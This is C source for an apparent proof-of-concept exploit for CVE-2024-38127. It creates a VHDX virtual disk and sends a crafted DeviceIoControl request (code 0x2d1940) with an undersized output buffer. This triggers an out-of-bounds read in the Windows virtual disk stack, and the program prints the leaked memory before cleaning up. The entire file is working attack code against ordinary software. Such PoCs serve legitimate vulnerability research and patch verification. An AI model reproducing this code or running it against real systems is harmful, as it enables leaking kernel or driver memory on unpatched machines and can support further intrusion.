#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <virtdisk.h>
#include <initguid.h>
#include <rpc.h>

#define VHDX_PATH L"C:\\Users\\Public\\CVE-2024-38127.vhdx"
#define OUT_BUFFER_SIZE 0x100

#pragma comment(lib, "Rpcrt4.lib")


DWORD
main(
	DWORD argc,
	PCHAR argv[]
) {

	DWORD status = 0;
	PWCHAR VhdxPath = VHDX_PATH;
	HANDLE Vhdx = NULL;
	GUID uniqueId;
	UuidCreate(&uniqueId);
	VIRTUAL_STORAGE_TYPE VStorType = { 0, };
	CREATE_VIRTUAL_DISK_PARAMETERS CreateParam = {
		.Version = CREATE_VIRTUAL_DISK_VERSION_2,
		.Version2 = {
			.UniqueId = uniqueId,
			.MaximumSize = 1073741824,//1GB
			.BlockSizeInBytes = 0,
			.SectorSizeInBytes = 512,
			.PhysicalSectorSizeInBytes = 512,
			.ParentPath = NULL
		},
	};
	void* OutBuffer = malloc(OUT_BUFFER_SIZE);
	ULONG SizeUsed = 0;

	memset(OutBuffer, 0, OUT_BUFFER_SIZE);

	printf("Before OOB Read\n");
	for (DWORD i = 0; i < OUT_BUFFER_SIZE/8; i++) {
		printf("%016llx ", ((DWORD64*)OutBuffer)[i]);
		if ((i + 1) % 2 == 0) printf("\n");
	}


	VStorType.DeviceId = VIRTUAL_STORAGE_TYPE_DEVICE_UNKNOWN;

	status = CreateVirtualDisk(
		&VStorType,
		VhdxPath,
		VIRTUAL_DISK_ACCESS_NONE,
		NULL,
		CREATE_VIRTUAL_DISK_FLAG_FULL_PHYSICAL_ALLOCATION,
		0,
		&CreateParam,
		NULL,
		&Vhdx
	);
	if(status != ERROR_SUCCESS){
		printf("[!] OpenVirtualDisk Failed with 0x%x\n", status);
		return status;
	}

	//Triggering Bug
	DWORD InBuffer = 5;
	status = DeviceIoControl(
		Vhdx,
		0x2d1940,
		&InBuffer,
		4,
		OutBuffer,
		0x20,
		NULL,
		NULL);

	printf("DeviceIoControl Result: 0x%x\n", status);
	
	printf("After OOB Read\n");
	for (DWORD i = 0; i < OUT_BUFFER_SIZE/8; i++) {
		printf("%016llx ", ((DWORD64*)OutBuffer)[i]);
		if ((i + 1) % 2 == 0) printf("\n");
	}

	if (status != ERROR_SUCCESS) {
		printf("[!] GetVirtualDiskInformation Failed with 0x%x\n", status);
	}

	CloseHandle(Vhdx);
	DeleteFileW(VHDX_PATH);
	free(OutBuffer);
	return status;
}
